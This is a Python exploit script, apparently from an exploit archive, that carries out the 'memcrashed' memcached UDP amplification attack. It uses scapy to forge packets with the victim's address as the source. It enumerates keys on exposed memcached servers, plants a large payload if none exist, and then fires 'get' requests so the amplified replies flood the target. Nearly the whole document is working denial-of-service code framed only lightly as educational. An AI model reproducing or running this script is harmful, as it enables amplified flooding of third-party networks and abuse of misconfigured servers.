# Download: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/44254.zip
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# This was created to better understand the memcrashed exploit 
# brought to light thanks to CloudFlare.
# (https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)
#
# Please sysadmin responsibly.
 
import requests
import memcache
import re
 
from scapy.all import *
 
# Vulnerable memcached server list
SERVER_LIST = [
        &#039;172.17.0.2:11211&#039;,
]
 
# Destination 
TARGET = &#039;1.2.3.4&#039;
 
# optional payload to set if no keys exist
payload = requests.get(&#039;https://google.com&#039;).text
payload_key = &#039;fuckit&#039;
 
# this forces payload to load into memory for being extra-evil and efficient
if not payload:
    print &#039;Could not import payload, continuing anyway&#039;
 
try:
    for server in SERVER_LIST:
        if &#039;:&#039; in server:
            server = server.split(&#039;:&#039;)[0]
 
        ip = IP(src=TARGET, dst=server)
        packet_base = &#039;\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n&#039;
 
        # fetch known keys by id
        statitems_packet = packet_base.format(&#039;stats items&#039;)
        udp = UDP(sport=50000, dport=11211)/statitems_packet
        keyids = []
        resp = sr1(ip/udp)
        for key in str(resp.payload).split(&#039;\r\n&#039;):
            # Skip first line which has hex in it (I&#039;m lazy)
            if &#039;age&#039; in key:
                key = key.split(&#039;:&#039;)[1]
                keyids.append(key)
 
        # fetch names for keys by id
        keys = []
        for kid in keyids:
            query = &#039;stats cachedump {0} 100&#039;.format(kid)
            keyid_packet = packet_base.format(query)
            udp = UDP(sport=50000, dport=11211)/keyid_packet
            resp = str(sr1(ip/udp).payload).split(&#039;\r\n&#039;)
            for key in resp:
                if &#039;ITEM&#039; in key:
                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)",key)
                    keys.append(res.group(&#039;keyname&#039;))
 
        if not keys:
            mc = memcache.Client([server],debug=False)
            mc.set(payload_key, payload)
            keys.append(payload_key)
 
        # iterate thru known keys and blast away
        for key in keys:
            query = &#039;get {0}&#039;.format(key)
            fun_packet = packet_base.format(query)
            udp = UDP(sport=50000, dport=11211)/fun_packet
            sr1(ip/udp)
 
except Exception:
    raise

